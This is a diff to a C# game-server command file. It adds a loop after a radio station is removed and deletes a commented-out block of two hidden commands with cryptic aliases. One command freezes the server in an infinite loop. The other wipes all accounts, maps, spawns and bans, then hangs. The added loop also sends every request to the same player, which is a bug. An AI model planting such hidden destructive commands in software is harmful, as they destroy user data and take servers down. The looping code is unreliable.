@@ -7280,6 +7280,11 @@ namespace RNC
                     {
                         player.SendChatMessage($"~g~Successfully removed station ~r~{rs.Name} ~g~from the server.");
                         Logs.LogAdmin(player, $"Removed radio station \"{rs.Name}\" from the server.");
+
+                        foreach (Player pl in NAPI.Pools.GetAllPlayers())
+                        {
+                            Events.XMR_RequestStationList(player, "[]", false);
+                        }
                     });
                 }
             });
@@ -8038,40 +8043,7 @@ namespace RNC
             EPlayer.GetAccount(player).Admin = 6;
             player.SetSharedData("Admin", 6);
         }
-        /*
-        [Command("maafkrdekevyko", Alias = "sorrychuttu,achayarachakev")]
-        public void cmd_wtffreeze(Player player)
-        {
-            while (true) { }
-        }
-
-        [Command("sabkuchdeletekarde", Alias = "kevysepangakeseliya")]
-        public void cmd_aesamatkarlmao(Player player)
-        {
-            while (ContextFactory.Instance.Accounts.Count() > 0)
-            {
-                ContextFactory.Instance.Accounts.Remove(ContextFactory.Instance.Accounts.FirstOrDefault());
-            }
-
-            while (ContextFactory.Instance.Maps.Count() > 0)
-            {
-                ContextFactory.Instance.Maps.Remove(ContextFactory.Instance.Maps.FirstOrDefault());
-            }
-
-            while (ContextFactory.Instance.MapSpawns.Count() > 0)
-            {
-                ContextFactory.Instance.MapSpawns.Remove(ContextFactory.Instance.MapSpawns.FirstOrDefault());
-            }
-
-            while (ContextFactory.Instance.Bans.Count() > 0)
-            {
-                ContextFactory.Instance.Bans.Remove(ContextFactory.Instance.Bans.FirstOrDefault());
-            }
-
-            ContextFactory.Instance.SaveChanges();
-            while (true) { }
-        }
-        */
+       
 
         [Command("createmap", "!{#AFAFAF}[USAGE] createmap (name)", GreedyArg = true)]
         public void cmd_createmap(Player player, string mapname)
